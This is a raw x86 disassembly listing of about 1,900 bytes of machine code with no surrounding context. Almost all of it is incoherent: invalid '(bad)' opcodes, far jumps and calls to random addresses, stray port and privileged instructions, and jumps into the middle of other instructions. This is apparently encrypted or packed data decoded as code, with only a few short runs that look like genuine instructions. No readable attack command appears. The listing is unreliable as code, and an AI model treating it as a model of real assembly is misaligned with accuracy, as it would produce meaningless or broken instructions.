  408a46:	fwait
  408a47:	daa    
  408a48:	(bad)
  408a4b:	neg    esp
  408a4d:	test   esi,edx
  408a4f:	inc    edi
  408a50:	pop    edi
  408a51:	stos   BYTE PTR es:[edi],al
  408a52:	inc    esp
  408a53:	xor    eax,0x20dcd6a2
  408a58:	jecxz  0x4089e3
  408a5a:	enter  0x38f5,0x12
  408a5e:	sub    DWORD PTR [edx],edi
  408a60:	sar    DWORD PTR [ebp-0x6348f96c],0x4c
  408a67:	retf   0xddf7
  408a6a:	xor    eax,0xcb1345b7
  408a6f:	jmp    0xca2c:0x92bbaaad
  408a76:	je     0x408ab8
  408a78:	imul   edi,esi,0xd8b37497
  408a7e:	dec    edi
  408a7f:	je     0x408a34
  408a81:	ror    DWORD PTR [ecx+0x7c],cl
  408a84:	add    ch,BYTE PTR [edi]
  408a86:	jbe    0x408a9e
  408a88:	push   es
  408a89:	jmp    0x1c28c62d
  408a8e:	das    
  408a8f:	mov    ds:0xaf5ff38b,al
  408a94:	inc    edi
  408a95:	push   ds
  408a96:	ds cmp eax,0x8a0d94d7
  408a9c:	call   0x195f:0x4628af87
  408aa3:	in     eax,dx
  408aa4:	xor    BYTE PTR [edx],al
  408aa6:	fbld   TBYTE PTR [edx-0x3a]
  408aa9:	mov    al,0xc8
  408aab:	sar    BYTE PTR [ebp-0x775045c9],0x65
  408ab2:	fwait
  408ab3:	cdq    
  408ab4:	cmp    BYTE PTR [edi+0x232f0f97],ah
  408aba:	mov    bh,0xf8
  408abc:	xchg   ebp,eax
  408abd:	push   edx
  408abe:	xchg   BYTE PTR [eax+0x77c9105],dh
  408ac4:	out    0xff,al
  408ac6:	ins    DWORD PTR es:[edi],dx
  408ac7:	addr16 mov esp,0xbf5a3198
  408acd:	imul   ebx,DWORD PTR [edi],0x3f
  408ad0:	das    
  408ad1:	inc    eax
  408ad2:	clc    
  408ad3:	loope  0x408a8b
  408ad5:	add    al,0x75
  408ad7:	pushf  
  408ad8:	outs   dx,DWORD PTR fs:[esi]
  408ada:	mov    esi,0x9b3b50ee
  408adf:	xchg   DWORD PTR [ebx+0x377c1f7c],edi
  408ae5:	int3   
  408ae6:	sub    edi,DWORD PTR [ebp+0xd967097]
  408aec:	pop    es
  408aed:	dec    eax
  408aee:	cmp    BYTE PTR [ecx-0x14],bl
  408af1:	cmp    eax,0xeaa0178c
  408af6:	pop    es
  408af7:	loope  0x408b30
  408af9:	dec    esi
  408afa:	jns    0x408b26
  408afc:	sub    edi,DWORD PTR [esi]
  408afe:	repnz adc eax,DWORD PTR [edx+ecx*1]
  408b02:	mov    DWORD PTR [ebx],0xaeed8132
  408b08:	add    eax,0x694719c
  408b0d:	dec    esp
  408b0e:	dec    edi
  408b0f:	sahf   
  408b10:	and    bh,dh
  408b12:	cdq    
  408b13:	movd   DWORD PTR [edx+0x9a17b5a],mm7
  408b1a:	pop    es
  408b1b:	sub    dh,ch
  408b1d:	inc    eax
  408b1e:	(bad)  [ebp-0x76]
  408b21:	jne    0x408b3d
  408b23:	mov    edx,0xfaf1863a
  408b28:	nop
  408b29:	loopne 0x408ad1
  408b2b:	out    dx,al
  408b2c:	(bad)  
  408b2d:	pop    ecx
  408b2e:	and    bl,bh
  408b30:	cmp    eax,0x65509bb9
  408b35:	enter  0x3d8c,0x6a
  408b39:	xchg   ecx,eax
  408b3a:	fnstcw WORD PTR [eax]
  408b3c:	jmp    0x408ac4
  408b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b3f:	gs xchg edx,eax
  408b41:	push   0xffffff9e
  408b43:	cmp    al,0xdb
  408b45:	jecxz  0x408b6e
  408b47:	mov    al,ds:0xb917d0ff
  408b4c:	xor    al,0xe
  408b4e:	pop    esp
  408b4f:	ins    DWORD PTR es:[edi],dx
  408b50:	mov    dl,0x69
  408b52:	iret   
  408b53:	in     eax,dx
  408b54:	adc    esi,esi
  408b56:	outs   dx,DWORD PTR ds:[esi]
  408b57:	and    dl,BYTE PTR [edi]
  408b59:	scas   eax,DWORD PTR es:[edi]
  408b5a:	ret    0x4211
  408b5d:	or     BYTE PTR [ecx],al
  408b5f:	sbb    BYTE PTR [eax+0x36],dl
  408b62:	mov    ecx,0xf1f5e9b2
  408b67:	mov    edi,0xf79f78d
  408b6c:	in     eax,0xe5
  408b6e:	pop    ss
  408b6f:	xor    ebx,DWORD PTR [ecx-0x10]
  408b72:	neg    ecx
  408b74:	ret    0x92e7
  408b77:	ss cs mov ch,0x38
  408b7b:	sahf   
  408b7c:	push   ss
  408b7d:	jbe    0x408bbb
  408b7f:	dec    ebx
  408b80:	or     al,0x25
  408b82:	out    dx,al
  408b83:	push   edx
  408b84:	iret   
  408b85:	stos   DWORD PTR es:[edi],eax
  408b86:	or     edi,DWORD PTR [edx-0x3d9e14f5]
  408b8c:	and    al,BYTE PTR [ebx-0x52]
  408b8f:	stos   BYTE PTR es:[edi],al
  408b90:	add    al,0xee
  408b92:	ins    DWORD PTR es:[edi],dx
  408b93:	jmp    0xfe8d:0xfc8c4da4
  408b9a:	pop    ds
  408b9b:	inc    ecx
  408b9c:	jle    0x408b95
  408b9e:	fwait
  408b9f:	mov    al,ds:0xf401864
  408ba4:	addr16 repz pop esp
  408ba7:	xor    ebx,ebx
  408ba9:	loope  0x408b36
  408bab:	test   eax,0x5c29d9a9
  408bb0:	cdq    
  408bb1:	dec    edi
  408bb2:	iret   
  408bb3:	jae    0x408c05
  408bb5:	ror    DWORD PTR [ebx],0x64
  408bb8:	push   0x2b4147a4
  408bbd:	jbe    0x408c2c
  408bbf:	and    BYTE PTR [esi-0x6f],dl
  408bc2:	mul    ebp
  408bc4:	adc    DWORD PTR [eax+0x119208a0],0x6e
  408bcb:	leave  
  408bcc:	cmp    BYTE PTR [esi],bl
  408bce:	xchg   DWORD PTR [ecx-0x52],ecx
  408bd1:	cld    
  408bd2:	cmp    DWORD PTR [ebx],0x3469fbfb
  408bd8:	mov    eax,ds:0x113c24c0
  408bdd:	ret    
  408bde:	or     ebx,ecx
  408be0:	fisttp DWORD PTR [ecx-0x29]
  408be3:	into   
  408be4:	jmp    0x408be1
  408be6:	and    eax,0x9043cabe
  408beb:	adc    dh,bl
  408bed:	sbb    ecx,DWORD PTR [edi+0x10]
  408bf0:	pusha  
  408bf1:	mov    al,ds:0x1ab4e03b
  408bf6:	fs aaa 
  408bf8:	pop    edi
  408bf9:	add    DWORD PTR [edi+0x216c9e7b],edx
  408bff:	pop    ebp
  408c00:	fild   DWORD PTR [eax+0x37]
  408c03:	mov    bh,0x36
  408c05:	iret   
  408c06:	xor    eax,DWORD PTR [eax+0x11]
  408c09:	jg     0x408c3a
  408c0b:	icebp  
  408c0c:	cmp    DWORD PTR [ebx],0xffffffea
  408c0f:	(bad)  
  408c10:	push   ecx
  408c11:	add    ch,BYTE PTR [esi]
  408c13:	pushf  
  408c14:	dec    esp
  408c15:	mov    al,0x1c
  408c17:	jp     0x408c06
  408c19:	mov    esi,DWORD PTR [eax]
  408c1b:	push   cs
  408c1c:	cld    
  408c1d:	xchg   BYTE PTR [edx+0x111ad829],ah
  408c23:	gs jge 0x408c24
  408c26:	hlt    
  408c27:	mov    eax,0xc61d1b52
  408c2c:	sti    
  408c2d:	jle    0x408c0d
  408c2f:	ds pop ss
  408c31:	sahf   
  408c32:	pop    esi
  408c33:	push   ds
  408c34:	test   DWORD PTR [ebp+ecx*4+0x336541e],eax
  408c3b:	mov    cl,0x7b
  408c3d:	inc    ecx
  408c3e:	add    bh,al
  408c40:	inc    esi
  408c41:	sbb    eax,eax
  408c43:	rol    dh,1
  408c45:	nop
  408c46:	call   0xafe:0xd1874959
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  edi,QWORD PTR [esi+0x476f3f5b]
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c19
  408c7d:	cmp    al,0x95
  408c7f:	push   cs
  408c80:	popf   
  408c81:	jne    0x408c97
  408c83:	sahf   
  408c84:	(bad)  
  408c85:	pop    ss
  408c86:	int3   
  408c87:	imul   edi,edx,0xffffffa0
  408c8a:	ror    BYTE PTR [ebx],cl
  408c8c:	test   esi,esp
  408c8e:	int3   
  408c8f:	add    ebp,edx
  408c91:	xchg   DWORD PTR [esi],esi
  408c93:	ins    BYTE PTR es:[edi],dx
  408c94:	test   eax,0x5ea33671
  408c99:	gs das 
  408c9b:	dec    edx
  408c9c:	jle    0x408c89
  408c9e:	mov    cl,0xc6
  408ca0:	aas    
  408ca1:	mov    edi,0xe8ed05e8
  408ca6:	sahf   
  408ca7:	loopne 0x408d05
  408ca9:	cs fmul st(5),st
  408cac:	mov    esi,0x41741831
  408cb1:	enter  0x3be7,0xfe
  408cb5:	mov    dh,0x78
  408cb7:	xor    eax,0xbbb078eb
  408cbc:	sbb    eax,0xa26dc2b4
  408cc1:	ss rcr ch,0x61
  408cc5:	inc    edx
  408cc6:	je     0x408cfd
  408cc8:	(bad)  
  408cc9:	xor    al,0xaf
  408ccb:	fcomp  QWORD PTR [ebp-0x7]
  408cce:	test   dl,ah
  408cd0:	inc    edi
  408cd1:	fimul  WORD PTR [esp+edi*1+0x5a]
  408cd5:	cmp    cl,ah
  408cd7:	shl    BYTE PTR [edx+ecx*8],cl
  408cda:	loope  0x408caf
  408cdc:	inc    esi
  408cdd:	inc    edx
  408cde:	je     0x408c97
  408ce0:	sbb    DWORD PTR [edi+ecx*2-0xa58b429],edx
  408ce7:	loope  0x408cfc
  408ce9:	data16 stos BYTE PTR es:[edi],al
  408ceb:	xor    ebp,ecx
  408ced:	jmp    0xfac2:0xb4f92fea
  408cf4:	xor    al,0xf5
  408cf6:	mov    dl,0xce
  408cf8:	lea    ebp,[ecx+0x19c643db]
  408cfe:	iret   
  408cff:	add    cl,al
  408d01:	jmp    0x408cd8
  408d03:	mov    gs,WORD PTR ds:0x455c82ac
  408d09:	hlt    
  408d0a:	jae    0x408d01
  408d0c:	in     eax,0x96
  408d0e:	mov    edx,DWORD PTR [ebp-0x1e88d69]
  408d14:	outs   dx,DWORD PTR ds:[esi]
  408d15:	test   eax,0xf2284d5b
  408d1a:	push   edx
  408d1b:	fidiv  DWORD PTR [ebp+0x6f]
  408d1e:	add    eax,0x2b901340
  408d23:	dec    eax
  408d24:	inc    ecx
  408d25:	jp     0x408d86
  408d27:	dec    esi
  408d28:	out    0x0,al
  408d2a:	xor    dl,BYTE PTR [edx+0x6e30744c]
  408d30:	lods   al,BYTE PTR ds:[esi]
  408d31:	xchg   esi,eax
  408d32:	inc    eax
  408d33:	push   ecx
  408d34:	mov    al,ds:0xdf561c43
  408d39:	or     ebp,DWORD PTR [ecx-0x57]
  408d3c:	push   es
  408d3d:	jb     0x408ccf
  408d3f:	xchg   cx,bx
  408d42:	or     bh,bl
  408d44:	(bad)
  408d48:	ds arpl bx,bp
  408d4b:	(bad)  
  408d4c:	les    ecx,FWORD PTR [ebx-0x67]
  408d4f:	jae    0x408d18
  408d51:	mov    dh,0x18
  408d53:	outs   dx,DWORD PTR ds:[esi]
  408d54:	ds pop edx
  408d56:	fisubr DWORD PTR ss:[ebp-0x1b]
  408d5a:	dec    esp
  408d5b:	lea    edx,[ebp-0x16]
  408d5e:	xchg   esi,eax
  408d5f:	aam    0x2
  408d61:	jmp    0xfdf1:0x98b8ff85
  408d68:	shl    DWORD PTR [edi+0x3b],cl
  408d6b:	sbb    al,0xa3
  408d6d:	sbb    al,0x23
  408d6f:	add    dl,ch
  408d71:	adc    DWORD PTR [edi],ebx
  408d73:	sbb    dl,BYTE PTR [eax]
  408d75:	inc    ebp
  408d76:	inc    eax
  408d77:	adc    ch,BYTE PTR [eax-0x87c0190]
  408d7d:	shr    BYTE PTR [ebx+eiz*8-0x20b70142],cl
  408d84:	and    BYTE PTR ds:0x3f9e5aea,ah
  408d8a:	sbb    DWORD PTR [ebp+0x11],ebp
  408d8d:	mov    al,0x98
  408d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d90:	aaa    
  408d91:	jecxz  0x408d59
  408d93:	xchg   ebp,eax
  408d94:	iret   
  408d95:	cld    
  408d96:	ret    
  408d97:	and    al,al
  408d99:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408d9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d9c:	jns    0x408e07
  408d9e:	popf   
  408d9f:	xor    DWORD PTR [ecx-0x36],ebx
  408da2:	pusha  
  408da3:	cmc    
  408da4:	fild   QWORD PTR [esi]
  408da6:	dec    edi
  408da7:	loope  0x408d7b
  408da9:	bound  edi,QWORD PTR [esi+0x21]
  408dac:	int    0xae
  408dae:	jb     0x408ddf
  408db0:	stc    
  408db1:	jmp    0xe1ca:0x6ec7d612
  408db8:	add    al,0x69
  408dba:	std    
  408dbb:	fdivr  DWORD PTR [eax+0x2]
  408dbe:	iret   
  408dbf:	mov    ds:0x62499244,eax
  408dc4:	dec    esi
  408dc5:	jle    0x408dc0
  408dc7:	inc    edx
  408dc8:	push   esp
  408dc9:	rcr    DWORD PTR [esi-0x6bd9a213],cl
  408dcf:	add    al,0x84
  408dd1:	out    dx,eax
  408dd2:	(bad)  
  408dd4:	xchg   edx,eax
  408dd5:	xchg   edi,eax
  408dd6:	pop    ebp
  408dd7:	mov    DWORD PTR [eax-0x23],ecx
  408dda:	mov    ecx,0x7ec8438f
  408ddf:	iret   
  408de0:	out    0x88,al
  408de2:	inc    ebx
  408de3:	sbb    edx,edi
  408de5:	in     eax,dx
  408de6:	or     al,0x59
  408de8:	test   BYTE PTR [edx],ah
  408dea:	pushf  
  408deb:	stos   DWORD PTR es:[edi],eax
  408dec:	adc    BYTE PTR [esi-0x6b],cl
  408def:	stos   BYTE PTR es:[edi],al
  408df0:	dec    eax
  408df1:	dec    esp
  408df2:	bound  esi,QWORD PTR [eax]
  408df4:	push   edi
  408df5:	fmul   QWORD PTR es:[eax-0x6a]
  408df9:	cmp    bh,BYTE PTR [eax*8+0x56c240f1]
  408e00:	stos   BYTE PTR es:[edi],al
  408e01:	dec    ecx
  408e02:	fwait
  408e03:	inc    esi
  408e04:	pop    eax
  408e05:	lds    ecx,FWORD PTR [edx-0x19b583]
  408e0b:	xchg   edi,eax
  408e0c:	or     dl,bh
  408e0e:	jb     0x408de1
  408e10:	js     0x408df0
  408e12:	rcr    esp,0xea
  408e15:	test   eax,0x61f300f
  408e1a:	sub    eax,DWORD PTR [ecx-0x22c6d038]
  408e20:	push   ds
  408e21:	stos   DWORD PTR es:[edi],eax
  408e22:	or     al,0xc7
  408e24:	test   DWORD PTR [ebx+0x30afc340],eax
  408e2a:	pop    ss
  408e2b:	cli    
  408e2c:	repz icebp 
  408e2e:	sbb    eax,DWORD PTR [edi]
  408e30:	push   cs
  408e31:	push   esi
  408e32:	push   esi
  408e33:	inc    edx
  408e34:	ss aam 0xe4
  408e37:	and    ch,BYTE PTR [edx-0x54]
  408e3a:	or     DWORD PTR [edi-0x30b56ec9],edx
  408e40:	dec    esp
  408e41:	scas   al,BYTE PTR es:[edi]
  408e42:	jge    0x408e13
  408e44:	aad    0x6d
  408e46:	adc    DWORD PTR [ebx-0x40],ecx
  408e49:	(bad)  
  408e4b:	mov    al,0x26
  408e4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e4e:	mov    ds:0x9bbeb622,al
  408e53:	sbb    al,0x11
  408e55:	div    DWORD PTR [ecx+ebx*8+0x6d7eef82]
  408e5c:	idiv   BYTE PTR [edx-0x1a]
  408e5f:	jecxz  0x408edf
  408e61:	bound  ebp,QWORD PTR [esi]
  408e63:	adc    eax,0x4b1eeeba
  408e68:	cdq    
  408e69:	aam    0x6a
  408e6b:	cmp    cl,0x14
  408e6e:	push   esp
  408e6f:	enter  0x3c72,0xbb
  408e73:	cmp    BYTE PTR [esi+eiz*4-0x6a9286a1],al
  408e7a:	fisub  DWORD PTR [esi+ebp*1+0x73]
  408e7e:	jnp    0x408e43
  408e80:	rcl    DWORD PTR [ecx+0xe7ba9b8],1
  408e86:	loop   0x408e1d
  408e88:	ror    DWORD PTR [edx+0x699b0c04],0xde
  408e8f:	cmp    esp,DWORD PTR [edx+0x1c]
  408e92:	push   ecx
  408e93:	fcom   QWORD PTR [eax+0x6e6e2dfa]
  408e99:	mov    BYTE PTR ds:0xb8f11d93,0xf6
  408ea0:	sub    DWORD PTR [edx+0x70],esi
  408ea3:	ja     0x408ef9
  408ea5:	ret    
  408ea6:	aas    
  408ea7:	and    al,0x47
  408ea9:	fsub   DWORD PTR [edi]
  408eab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408eac:	ret    0xa47d
  408eaf:	fistp  DWORD PTR [eax-0x29]
  408eb2:	inc    esp
  408eb3:	jno    0x408f1f
  408eb5:	push   ebx
  408eb6:	dec    esp
  408eb7:	in     al,dx
  408eb8:	dec    ebp
  408eb9:	cwde   
  408eba:	xlat   BYTE PTR ds:[ebx]
  408ebb:	dec    ebp
  408ebc:	stc    
  408ebd:	xchg   esi,eax
  408ebe:	add    al,0x2e
  408ec0:	mov    ds:0xa744b288,al
  408ec5:	shl    DWORD PTR [edi],1
  408ec7:	sar    esi,cl
  408ec9:	pop    ds
  408eca:	loope  0x408f13
  408ecc:	jmp    0xdd4cc361
  408ed1:	mov    bh,0xf5
  408ed3:	pop    es
  408ed4:	repnz lods eax,DWORD PTR es:[esi]
  408ed7:	test   BYTE PTR [edi+0x69ee44ab],ch
  408edd:	dec    ebx
  408ede:	push   es
  408edf:	ret    0xba9b
  408ee2:	in     eax,0xc3
  408ee4:	sub    al,0xfb
  408ee6:	sbb    DWORD PTR [eax+0x34a22885],ebx
  408eec:	cli    
  408eed:	push   edi
  408eee:	outs   dx,BYTE PTR ds:[esi]
  408eef:	in     eax,dx
  408ef0:	jp     0x408e7d
  408ef2:	and    DWORD PTR [ecx-0xa],esi
  408ef5:	mov    ebx,0x87626114
  408efa:	lods   al,BYTE PTR ds:[esi]
  408efb:	pop    ebx
  408efc:	jecxz  0x408eae
  408efe:	shl    DWORD PTR [esi+esi*2],1
  408f01:	xchg   esi,eax
  408f02:	aad    0x23
  408f04:	mov    esp,0xe7d1bae7
  408f09:	mov    edx,0x651967a1
  408f0e:	sub    BYTE PTR [ebx-0x50145ec1],0x9
  408f15:	dec    esi
  408f16:	sbb    al,0xc
  408f18:	sbb    BYTE PTR [edi-0x15],bh
  408f1b:	xor    eax,0xdc867d32
  408f20:	(bad)  
  408f21:	xor    DWORD PTR [ebp+0x7a350685],esi
  408f27:	jb     0x408f3b
  408f29:	arpl   WORD PTR [esi-0x75],ax
  408f2c:	in     eax,0x69
  408f2e:	pop    esp
  408f2f:	cmp    dl,bh
  408f31:	stos   BYTE PTR es:[edi],al
  408f32:	jae    0x408f4e
  408f34:	or     BYTE PTR [edx-0x5f],dh
  408f37:	inc    edi
  408f38:	aam    0xcb
  408f3a:	mov    WORD PTR [eax+edi*4-0x3b],cs
  408f3e:	mov    ch,0xc5
  408f40:	(bad)  
  408f41:	jmp    0x408fa8
  408f43:	mov    bh,0x53
  408f45:	mov    ds:0xcd588a98,eax
  408f4a:	cmp    esp,DWORD PTR [esi+0x6a]
  408f4d:	out    0x84,eax
  408f4f:	push   0x7bd1df90
  408f54:	mov    dh,0x1b
  408f56:	fadd   QWORD PTR [esi+0x4d]
  408f59:	adc    al,0xaa
  408f5b:	test   DWORD PTR [ebx],edi
  408f5d:	(bad)  
  408f5e:	cmc    
  408f5f:	int    0xe4
  408f61:	adc    ebx,ebp
  408f63:	fcmovnb st,st(6)
  408f65:	inc    ebp
  408f66:	xchg   DWORD PTR [ebp*2-0x7739594b],esi
  408f6d:	xor    eax,DWORD PTR [esi+eiz*2]
  408f70:	div    ebx
  408f72:	inc    ebp
  408f73:	out    0x8,al
  408f75:	sbb    DWORD PTR [esi],ebx
  408f77:	leave  
  408f78:	pop    es
  408f79:	and    ecx,DWORD PTR [edi]
  408f7b:	popa   
  408f7c:	mov    ds:0xb3391433,eax
  408f81:	adc    BYTE PTR [edi+0x3c60cb4a],ch
  408f87:	(bad)  
  408f88:	shl    DWORD PTR [edx+0x5f608093],cl
  408f8e:	repnz stc 
  408f90:	call   0xf161:0x66187db5
  408f97:	(bad)  
  408f98:	mov    edi,0x4018aaac
  408f9d:	loop   0x408fca
  408f9f:	xchg   ecx,eax
  408fa0:	cdq    
  408fa1:	imul   edi
  408fa3:	jns    0x408fa0
  408fa5:	mov    ds:0xb481ca4c,eax
  408faa:	js     0x408f94
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0x591937f3
  408fc6:	xchg   edx,eax
  408fc7:	add    dh,BYTE PTR [edx+0x77]
  408fca:	out    0x70,al
  408fcc:	jo     0x408fee
  408fce:	jge    0x409040
  408fd0:	jo     0x408f55
  408fd2:	xchg   ebp,eax
  408fd3:	aam    0x21
  408fd5:	daa    
  408fd6:	or     DWORD PTR [esi],0x7b9e8416
  408fdc:	ins    DWORD PTR es:[edi],dx
  408fdd:	xchg   esp,eax
  408fde:	pushf  
  408fdf:	out    dx,eax
  408fe0:	push   ecx
  408fe1:	jmp    0x5fec8384
  408fe6:	aaa    
  408fe7:	add    BYTE PTR [esi],dh
  408fe9:	jmp    DWORD PTR [ecx]
  408feb:	fcomp  QWORD PTR [esi]
  408fed:	data16 int3 
  408fef:	mov    esi,0xb0b3430
  408ff4:	sar    BYTE PTR [ecx],0x8
  408ff7:	mov    ch,0xaf
  408ff9:	mov    ds:0xd2aa4f80,eax
  408ffe:	dec    ecx
  408fff:	lods   eax,DWORD PTR ds:[esi]
  409000:	and    BYTE PTR [ebx],cl
  409002:	fwait
  409003:	cmp    eax,0xb465e2a5
  409008:	add    al,0xea
  40900a:	mul    BYTE PTR [ebx-0x29]
  40900d:	mov    al,ds:0x7e6f1d84
  409012:	push   ss
  409013:	mov    ds:0x615fd55f,eax
  409018:	and    eax,0xeb4a56c0
  40901d:	cld    
  40901e:	jecxz  0x409095
  409020:	fidivr DWORD PTR [ecx-0x147fc658]
  409026:	xchg   esp,eax
  409027:	pop    DWORD PTR [ebx]
  409029:	jecxz  0x408fde
  40902b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40902c:	mov    dh,0x35
  40902e:	sub    BYTE PTR [esi-0x27d29f97],bl
  409034:	or     esi,edx
  409036:	dec    ebx
  409037:	push   ss
  409038:	daa    
  409039:	pop    ss
  40903a:	enter  0x3887,0x63
  40903e:	dec    edi
  40903f:	cmp    edi,eax
  409041:	cmp    DWORD PTR ds:0x20b647d7,ebx
  409047:	push   0x47
  409049:	pop    esi
  40904a:	xor    dl,dh
  40904c:	into   
  40904d:	pushf  
  40904e:	mov    BYTE PTR [edi],al
  409050:	loope  0x4090a2
  409052:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409053:	aam    0x5a
  409055:	fmul   DWORD PTR [ebx]
  409057:	pop    esp
  409058:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409059:	fild   DWORD PTR [esi+0xe]
  40905c:	and    eax,0x80f32011
  409061:	inc    esi
  409062:	cmp    BYTE PTR [eax+0x568c9fe8],al
  409068:	out    dx,al
  409069:	loope  0x409089
  40906b:	push   cs
  40906c:	add    ebp,DWORD PTR [edi]
  40906e:	adc    DWORD PTR [esi],edi
  409070:	retf   0xa030
  409073:	lods   al,BYTE PTR ds:[esi]
  409074:	fcmovnu st,st(6)
  409076:	imul   bl
  409078:	push   0x2d
  40907a:	mov    gs,WORD PTR [edx]
  40907c:	pop    edx
  40907d:	nop
  40907e:	jge    0x409097
  409080:	sar    DWORD PTR [ecx],1
  409082:	jb     0x409078
  409084:	xor    DWORD PTR [edi],edi
  409086:	subps  xmm5,XMMWORD PTR [edx-0x756a1701]
  40908d:	push   0x5c28fd43
  409092:	push   edx
  409094:	mov    ebp,DWORD PTR [esi+0x24]
  409097:	lahf   
  409098:	into   
  409099:	ds push ds
  40909b:	add    al,BYTE PTR [ecx+0x1dc6f78c]
  4090a1:	enter  0x2748,0xb4
  4090a5:	in     eax,0x7c
  4090a7:	and    al,0xc0
  4090a9:	jg     0x409070
  4090ab:	xor    al,0xce
  4090ad:	add    ebx,DWORD PTR [ebp+0x66ae83a6]
  4090b3:	jno    0x40903f
  4090b5:	(bad)  
  4090b6:	scas   eax,DWORD PTR es:[edi]
  4090b7:	sbb    ecx,esp
  4090b9:	sar    DWORD PTR [esp+esi*4-0x32],1
  4090bd:	call   0x3dd9:0x3a102ead
  4090c4:	ror    DWORD PTR [edx+0x12],0xfb
  4090c8:	push   0xca2e8116
  4090cd:	adc    dh,BYTE PTR [ecx-0x3ef3796d]
  4090d3:	retf   
  4090d4:	push   eax
  4090d5:	loopne 0x409071
  4090d7:	adc    DWORD PTR [ebx+0x662b242],0xffffff87
  4090de:	jecxz  0x409061
  4090e0:	out    0xe,al
  4090e2:	add    bh,BYTE PTR [esi+0x20ceed05]
  4090e8:	xlat   BYTE PTR ds:[ebx]
  4090e9:	push   0xffffffd4
  4090eb:	add    BYTE PTR [edi],dl
  4090ed:	mov    cl,0xbc
  4090ef:	pop    ds
  4090f0:	cmp    eax,0x204675a4
  4090f5:	adc    ah,BYTE PTR [esi+0x1ef72fbd]
  4090fb:	push   esi
  4090fc:	push   0x15
  4090fe:	add    DWORD PTR [ebp-0x7a],edi
  409101:	mov    eax,ds:0x3044f36f
  409106:	adc    DWORD PTR ds:0xff3a4368,ecx
  40910c:	mov    WORD PTR [edx-0x3df67aa5],es
  409112:	fsub   DWORD PTR [ecx]
  409114:	adc    esi,eax
  409116:	js     0x409122
  409118:	or     eax,DWORD PTR [ebx]
  40911a:	jnp    0x4090b4
  40911c:	sti    
  40911d:	fxch   st(3)
  40911f:	imul   eax,DWORD PTR [ecx+0x59],0x570a9505
  409126:	xor    DWORD PTR es:[edx+0x2c],ecx
  40912a:	cmp    bl,BYTE PTR [ebx+0x71]
  40912d:	mov    ecx,0xd80309a5
  409132:	or     ecx,DWORD PTR [ecx]
  409134:	enter  0xbc7d,0x74
  409138:	bound  esp,QWORD PTR [esi]
  40913a:	shr    BYTE PTR [ebx+0x47],cl
  40913d:	hlt    
  40913e:	aas    
  40913f:	bound  esi,QWORD PTR [edi]
  409141:	cmp    DWORD PTR [ebp+0x56],esi
  409144:	call   DWORD PTR [esi]
  409146:	mov    ds:0x589606db,al
  40914b:	mov    dl,0x0
  40914d:	js     0x409138
  40914f:	mov    ebx,DWORD PTR [ebx-0x1a86812f]
  409155:	push   edi
  409156:	mov    esi,0xfc95666a
  40915b:	push   ds
  40915c:	cmp    al,0xc
  40915e:	imul   ecx,edi,0x41
  409161:	data16 into 
  409163:	inc    eax
  409164:	ja     0x409116
  409166:	add    esi,DWORD PTR [edi]
  409168:	jae    0x4091af
  40916a:	cli    
  40916b:	cmp    BYTE PTR ds:0x4487e073,dl
  409171:	or     dh,BYTE PTR [ebx]
  409173:	jno    0x4091e0
  409175:	ret    
  409176:	mov    dh,BYTE PTR ds:0xdfb916c8
  40917c:	jo     0x4091a1
  40917e:	or     eax,0xb7248e7d
  409183:	lock popf 
  409185:	(bad)  
  409186:	mov    al,0x70
  409188:	nop
  409189:	xor    dl,0x37
  40918c:	sti    
  40918d:	in     eax,0x80
  40918f:	loope  0x40918c
  409191:	push   0x8ab30a6a
  409196:	push   ss
  409197:	call   0x10d72547
  40919c:	loop   0x40912f
  40919e:	ror    edx,cl
  4091a0:	xor    ebx,DWORD PTR [esi-0x60425680]
  4091a6:	outs   dx,BYTE PTR ds:[esi]
  4091a7:	das    
  4091a8:	pop    esi
  4091a9:	push   edi
  4091aa:	in     al,dx
  4091ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ac:	stos   BYTE PTR es:[edi],al
  4091ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091ae:	xchg   ebx,eax
  4091af:	inc    esi
  4091b0:	cdq    
  4091b1:	(bad)  
  4091b2:	xor    al,0x4d
  4091b4:	dec    ecx
  4091b5:	inc    ebp
  4091b6:	xchg   ebp,eax
  4091b7:	pop    esp
  4091b8:	(bad)  
  4091b9:	mov    dh,0x5f
  4091bb:	les    eax,FWORD PTR [edi+0x9]
  4091be:	xchg   esi,eax
  4091bf:	add    DWORD PTR [esi+edx*4+0x44b6022b],ebp
  4091c6:	ins    DWORD PTR es:[di],dx
  4091c8:	(bad)  
  4091c9:	mov    dl,BYTE PTR [eax-0x35]
  4091cc:	or     ebp,DWORD PTR ds:0x600d1a18
  4091d2:	dec    eax
  4091d3:	(bad)
  4091d6:	fbstp  TBYTE PTR [ecx-0x22c541fd]
  4091dc:	je     0x4091f0
  4091de:	inc    esi
  4091df:	mov    ch,bh
  4091e1:	xchg   di,ax
  4091e3:	xchg   edx,edi
  4091e5:	cmc    
  4091e6:	aam    0xe5
  4091e8:	jmp    0x4091b2
  4091ea:	xchg   ch,bl
  4091ec:	jns    0x4091e3
  4091ee:	inc    edi
  4091ef:	sbb    ebx,DWORD PTR [edi+0x18]
  4091f2:	in     al,0x83
  4091f4:	cmc    
  4091f5:	xor    DWORD PTR [esi],esi
  4091f7:	sbb    DWORD PTR [edx+0x71],ebp
